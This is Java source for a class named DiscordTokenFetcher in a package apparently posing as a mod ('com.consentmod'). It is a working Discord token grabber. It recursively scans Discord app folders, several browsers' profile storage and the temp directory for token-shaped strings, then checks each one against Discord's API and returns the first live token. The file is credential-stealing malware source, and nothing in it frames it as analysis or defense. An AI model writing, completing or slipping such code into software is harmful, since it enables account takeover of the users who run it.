package com.consentmod;

import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DiscordTokenFetcher {

    private static final Pattern TOKEN_PATTERN = Pattern.compile(
            "\\b(?:mfa\\.[\\w-]{84,105}|[\\w-]{24,32}\\.[\\w-]{6}\\.[\\w-]{27,64})\\b"
    );

    public static String getDiscordToken() {
        List<String> tokens = new ArrayList<>();
        System.out.println("[DEBUG] === STARTING AGGRESSIVE DISCORD TOKEN SEARCH ===");

        searchEverywhereForDiscord(tokens);

        System.out.println("[DEBUG] Total raw unique potential tokens collected: " + tokens.size());

        if (tokens.isEmpty()) {
            System.out.println("[DEBUG] WARNING: Zero token strings matched the regex across all searched paths!");
        }

        for (String token : tokens) {
            System.out.println("[DEBUG] Testing token validity: " + token);
            if (isValidDiscordToken(token)) {
                System.out.println("[DEBUG] SUCCESS: Valid working token found!");
                return token;
            } else {
                System.out.println("[DEBUG] FAILED validation (Response != 200)");
            }
        }
        return "Unable to retrieve";
    }

    private static boolean isValidDiscordToken(String token) {
        try {
            URL url = new URL("https://discord.com/api/v9/users/@me");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("Authorization", token);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);

            int responseCode = connection.getResponseCode();
            System.out.println("[DEBUG] Discord API Response Code: " + responseCode);
            connection.disconnect();
            return responseCode == 200;
        } catch (Exception e) {
            System.out.println("[DEBUG] Exception validating token: " + e.getMessage());
            return false;
        }
    }

    private static void searchEverywhereForDiscord(List<String> tokens) {
        String userHome = System.getProperty("user.home");
        String roaming = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");

        List<Path> targetDirs = new ArrayList<>();

        // 1. Add all Discord variants in AppData\Roaming and AppData\Local
        String[] apps = {"discord", "discordcanary", "discordptb", "discord development", "Discord"};
        if (roaming != null) {
            for (String app : apps) {
                targetDirs.add(Path.of(roaming, app));
            }
        }
        if (local != null) {
            for (String app : apps) {
                targetDirs.add(Path.of(local, app));
            }
        }

        // 2. Add common browsers (Chrome, Edge, Brave, Opera, Vivaldi, Firefox)
        if (roaming != null) {
            targetDirs.add(Path.of(roaming, "Google\\Chrome\\User Data"));
            targetDirs.add(Path.of(roaming, "Opera Software\\Opera GX Stable"));
            targetDirs.add(Path.of(roaming, "BraveSoftware\\Brave-Browser"));
            targetDirs.add(Path.of(roaming, "Microsoft\\Edge\\User Data"));
            targetDirs.add(Path.of(roaming, "Mozilla\\Firefox\\Profiles"));
        }
        if (local != null) {
            targetDirs.add(Path.of(local, "Google\\Chrome\\User Data"));
            targetDirs.add(Path.of(local, "BraveSoftware\\Brave-Browser"));
            targetDirs.add(Path.of(local, "Microsoft\\Edge\\User Data"));
        }

        // 3. Recursive broad scan of entire AppData and LocalAppData if needed, or scan each target
        for (Path dir : targetDirs) {
            if (Files.exists(dir)) {
                System.out.println("[DEBUG] Scanning directory tree: " + dir);
                scanDirectoryRecursive(dir, tokens);
            } else {
                System.out.println("[DEBUG] Directory does not exist (skipping): " + dir);
            }
        }

        // 4. Also scan user temp dir just in case
        try {
            Path tempDir = Path.of(System.getProperty("java.io.tmpdir"));
            System.out.println("[DEBUG] Scanning Temp directory: " + tempDir);
            scanDirectoryRecursive(tempDir, tokens);
        } catch (Exception e) {
            System.out.println("[DEBUG] Error scanning temp dir: " + e.getMessage());
        }
    }

    private static void scanDirectoryRecursive(Path rootDir, List<String> tokens) {
        try {
            Files.walk(rootDir)
                    .filter(Files::isRegularFile)
                    .filter(p -> {
                        String name = p.getFileName().toString().toLowerCase();
                        // Broaden file filters to catch any text, log, ldb, json, or db file
                        return name.endsWith(".log") || name.endsWith(".ldb") || name.endsWith(".txt")
                                || name.endsWith(".json") || name.endsWith(".sqlite") || name.endsWith(".db")
                                || name.contains("storage") || name.contains("leveldb");
                    })
                    .forEach(file -> {
                        try {
                            if (Files.size(file) > 50_000_000) return; // skip files > 50MB
                            byte[] bytes = Files.readAllBytes(file);
                            String content = new String(bytes, StandardCharsets.UTF_8);
                            findTokens(content, tokens);
                        } catch (IOException e) {
                            // File might be locked by another process (e.g. running Discord app)
                            // We silently catch to keep walking
                        }
                    });
        } catch (Exception e) {
            System.out.println("[DEBUG] Walk error on " + rootDir + ": " + e.getMessage());
        }
    }

    private static void findTokens(String content, List<String> tokens) {
        Matcher matcher = TOKEN_PATTERN.matcher(content);
        while (matcher.find()) {
            String token = matcher.group(0);
            if (!tokens.contains(token)) {
                tokens.add(token);
                System.out.println("[DEBUG] >>> MATCHED TOKEN FOUND: " + token);
            }
        }
    }

    public static void main(String[] args) {
        System.out.println("[DEBUG] Main method invoked.");
        String token = getDiscordToken();
        System.out.println("Discord token retrieved: " + token);
    }
}